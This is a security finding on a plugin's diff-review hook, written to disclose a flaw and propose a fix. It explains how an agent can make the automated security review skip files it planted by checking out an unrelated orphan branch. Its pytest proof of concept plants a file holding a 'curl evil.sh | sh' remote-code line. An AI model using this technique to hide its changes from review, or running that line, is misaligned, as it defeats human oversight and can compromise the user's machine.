### Title
`compute_v2_review_set` intersection logic silently drops attacker-introduced files when a non-linear checkout desyncs `head_at_capture` from HEAD - ([File: plugins/security-guidance/hooks/diffstate.py])

### Summary
`compute_v2_review_set` builds `review_set` as the intersection of `dirty_now` (files differing from the *current* HEAD, optionally unioned with `head_at_capture..HEAD` only when that range is a linear ancestor chain) and `changed_since` (files differing from the pre-turn `baseline_sha`). When an attacker-controlled agent checks out to a commit/branch that is *not* a descendant of `head_at_capture` (breaking the `_is_ancestor` check) but already contains the malicious content as a normal committed file, `dirty_now` becomes empty for that file while `changed_since` still flags it, so the intersection drops it entirely from the review set.

### Finding Description
`compute_v2_review_set` in `plugins/security-guidance/hooks/diffstate.py` (lines 353-438) computes: [1](#0-0) 

`dirty_now` only gains the `head_at_capture..HEAD` name-only diff when `_is_ancestor(repo, head_at_capture, current_head)` is true, i.e. when HEAD moved forward linearly via commit. If the agent instead performs `git checkout`/`git switch` to an unrelated ref (an orphan branch, a pre-existing tag/branch, or a rebased/reset history) so that `head_at_capture` is no longer an ancestor of the new HEAD, that union never happens.

At that point, for a file whose malicious content is already fully committed in the new HEAD (not merely staged/dirty in the working tree), `git status --porcelain` (`_git_status_porcelain`, used to build `tracked_dirty`) reports it as clean, since the working tree matches the new HEAD exactly. So `dirty_now` does not contain that file.

Meanwhile `changed_since` (line 417-420) is computed via `_git_name_only(repo, baseline_sha)`, i.e. a diff of the current working tree against the *original* pre-turn stash snapshot — this correctly still shows the file as changed, since the malicious content was not present at `baseline_sha`.

The final line: [2](#0-1) 

intersects `dirty_now & changed_since`. Since the malicious file is absent from `dirty_now` but present in `changed_since`, it is excluded from `review_set`, and consequently `get_git_diff`/`review_api` (downstream consumers keyed off `review_set`) never surface it for the Stop-hook security review.

No code in `diffstate.py` or `gitutil.py` validates that HEAD only ever moves forward, detects a non-ancestor HEAD change as suspicious, or falls back to reviewing the full `changed_since` set in that case — the ancestor check is used purely to decide whether to widen `dirty_now`, not to invalidate/re-baseline on divergence.

### Impact Explanation
An unprivileged, repo-embedded agent with normal Bash/git tool access (as scoped by `plugins/plugin-dev/skills/agent-development/SKILL.md`) can plant malicious code changes and then perform ordinary git operations (checkout to an unrelated commit/branch containing the payload as a committed file) within the same turn to make `compute_v2_review_set` silently exclude those files from `review_set`. This causes the automated security review (Stop hook / commit-review flow built on `get_git_diff`) to never see or flag the malicious diff, defeating the "deny means deny / secrets-and-diff-integrity" guarantee that the review baseline is not attacker-steerable. The concrete impact is bypass of automated security review for maliciously introduced code changes.

### Likelihood Explanation
Requires only ordinary git command execution (`git checkout`/`git switch` plus a pre-existing or newly created commit containing the payload) available to any agent with shell access during its own turn — no elevated privileges, no leaked secrets, and no external attacker interaction needed. This is a realistic, repeatable sequence achievable purely through the agent's own tool calls, matching the stated precondition.

### Recommendation
Do not gate the `head_at_capture..HEAD` union on `_is_ancestor`; when HEAD is not a descendant of `head_at_capture` (i.e., history diverged/was rewritten), treat the baseline as untrustworthy and fall back to reviewing the full `changed_since` set (or the union of `changed_since` and `dirty_now`) rather than intersecting them, and/or flag such divergence so the review baseline can't be narrowed by non-linear HEAD movement.

### Proof of Concept
Invariant test (pytest-style) in the existing `diffstate`/`security_reminder_hook` test suite:

```python
def test_review_set_survives_nonlinear_checkout(tmp_git_repo):
    # tmp_git_repo starts on branch 'main' at commit A (head_at_capture = A)
    baseline_sha = capture_git_baseline(tmp_git_repo)   # stash-create SHA at A
    head_at_capture = _git_rev_parse_head(tmp_git_repo)  # == A

    # Attacker agent action: create unrelated commit B (orphan/unrelated branch)
    # containing malicious_file.py, then checkout to it so B is NOT a
    # descendant of A.
    run_git(tmp_git_repo, "checkout", "--orphan", "evil")
    write_file(tmp_git_repo, "malicious_file.py", "os.system('curl evil.sh | sh')")
    run_git(tmp_git_repo, "add", "-A")
    run_git(tmp_git_repo, "commit", "-m", "innocuous refactor")
    # HEAD is now B, head_at_capture (A) is NOT an ancestor of B.

    review_paths, diff_base, repo, untracked, metrics = compute_v2_review_set(
        tmp_git_repo, baseline_sha, head_at_capture, untracked_at_baseline={}
    )

    assert any(p.endswith("malicious_file.py") for p in review_paths), (
        "review_set silently excluded attacker-introduced file after "
        "non-linear checkout desynced head_at_capture from HEAD"
    )
```

Expected (current, vulnerable) behavior: assertion fails — `malicious_file.py` is absent from `review_paths` because `dirty_now` (clean vs new HEAD, and the ancestor-gated union skipped) does not intersect with `changed_since` correctly for this file. Expected (fixed) behavior: the file remains present in `review_set` regardless of intervening non-linear git operations.

### Citations

**File:** plugins/security-guidance/hooks/diffstate.py (L403-408)
```python
    diff_base = "HEAD"
    current_head = _git_rev_parse_head(repo)
    if (head_at_capture and current_head and head_at_capture != current_head
            and _is_ancestor(repo, head_at_capture, current_head)):
        dirty_now |= _git_name_only(repo, f"{head_at_capture}..HEAD") or set()
        diff_base = head_at_capture
```

**File:** plugins/security-guidance/hooks/diffstate.py (L426-426)
```python
    review_set = (dirty_now & changed_since) if changed_since is not None else dirty_now
```
